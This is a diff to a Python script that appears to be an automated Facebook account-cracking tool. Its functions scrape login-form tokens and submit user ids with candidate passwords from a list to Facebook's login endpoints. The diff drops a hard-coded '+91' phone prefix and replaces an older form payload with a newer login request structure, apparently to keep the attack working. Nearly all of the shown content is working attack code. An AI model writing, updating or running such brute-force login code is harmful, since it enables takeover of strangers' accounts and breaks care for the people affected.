@@ -1568,7 +1568,7 @@ def mobile(uid,pwx,tl):
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': '+91'+uid,
+            'email': uid,
             'login_source': 'comet_headerless_login',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
@@ -1750,13 +1750,69 @@ def d(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
-            'lsd': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'jazoest': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'next': 'https://m.facebook.com/v3.2/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback&scope=email&state=https%3A%2F%2Fpixlr.com%2F&client_id=144117062837799&ret=login&fbapp_pres=0&logger_id=27279048-2ffa-4266-a587-1693d6522204&tp=unspecified',
-            'flow': 'login_no_pin',
-            'pass': pw,
-            'login': 'Log in'}
+    "__aaid": "0",
+    "__user": "0",
+    "__a": "1",
+    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    "params": {
+        "params": {
+            "server_params": {
+                "credential_type": "password",
+                "username_text_input_id": "ukxzy8:65",
+                "password_text_input_id": "",
+                "login_source": "Login",
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "ar_event_source": "login_home_page",
+                "should_trigger_override_login_success_action": 0,
+                "should_trigger_override_login_2fa_action": 0,
+                "is_caa_perf_enabled": 0,
+                "reg_flow_source": "login_home_native_integration_point",
+                "caller": "gslr",
+                "is_from_landing_page": 0,
+                "is_from_empty_password": 0,
+                "is_from_password_entry_page": 0,
+                "is_from_assistive_id": 0,
+                "INTERNALlatency_qpl_marker_id": 36707139,
+                "INTERNALlatency_qpl_instance_id": "184916384000392",
+                "device_id": None,
+                "family_device_id": None,
+                "waterfall_id": "bf55587b-aee0-46cb-b45b-0ff01e3b44c6",
+                "offline_experiment_group": None,
+                "layered_homepage_experiment_group": None,
+                "is_platform_login": 0,
+                "is_from_logged_in_switcher": 0,
+                "is_from_logged_out": 0,
+                "access_flow_version": "F2_FLOW",
+                "INTERNAL_INFRA_THEME": "harm_f"
+            },
+            "client_input_params": {
+                "machine_id": "",
+                "contact_point": uid,
+                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+                "accounts_list": [],
+                "fb_ig_device_id": [],
+                "secure_family_device_id": "",
+                "encrypted_msisdn": "",
+                "headers_infra_flow_id": "",
+                "try_num": 1,
+                "login_attempt_count": 1,
+                "event_flow": "login_manual",
+                "event_step": "home_page",
+                "openid_tokens": {},
+                "auth_secure_device_id": "",
+                "client_known_key_hash": "",
+                "has_whatsapp_installed": 0,
+                "sso_token_map_json_string": "",
+                "should_show_nested_nta_from_aymh": 0,
+                "lois_settings": {
+                    "lois_token": "",
+                    "lara_override": ""
+                }
+            }
+        }
+    }
+}
             headers = {
             'authority': 'mbasic.facebook.com',
             'accept': '*/*',
